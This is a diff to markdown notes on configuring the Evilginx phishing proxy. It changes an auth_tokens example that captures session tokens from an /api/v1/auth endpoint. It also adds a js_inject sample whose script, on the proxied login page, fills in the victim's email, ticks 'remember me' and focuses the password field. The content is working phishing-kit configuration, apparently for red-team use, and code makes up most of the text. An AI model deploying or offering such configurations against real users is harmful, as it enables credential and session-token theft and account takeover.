@@ -45,7 +45,7 @@
     * Example in YAML:
     ```yaml
     auth_tokens:
-      - domain: 'bladerunner.lab.evilginx.com'
+      - domain: 'dummy.dum.evilginx.com'
         path: '/api/v1/auth/.*'
         name: 'token'
         search: '"token":"([^"]*)"'
@@ -61,3 +61,32 @@
         type: 'json'
     ```
 
+15. JS injection using Evilginx.
+
+    For the JS to be injected, you need to add `trigger_params` and its parameter; otherwise, it won't be injected. Sample YAML for `js_inject`:
+    ```yaml
+    js_inject:
+      - trigger_domains: ["dummy.dym.evilginx.com"]
+        trigger_paths: ["/"]
+        trigger_params: ["email"]
+        script: |
+          function aaa() {
+            var u = document.querySelector("input[type=email]");
+            var p = document.querySelector("input[type=password]");
+            var c = document.querySelector("#rememberCheck");
+            if (u !== null && p !== null && c !== null) {
+              c.checked = true;
+              u.value= "{email}";
+              p.focus();
+            }
+            else {
+              bbb();
+            }
+          }
+          function bbb() {
+            setTimeout(function() {aaa();}, 100);
+          }
+          bbb();
+    ```
+
+    
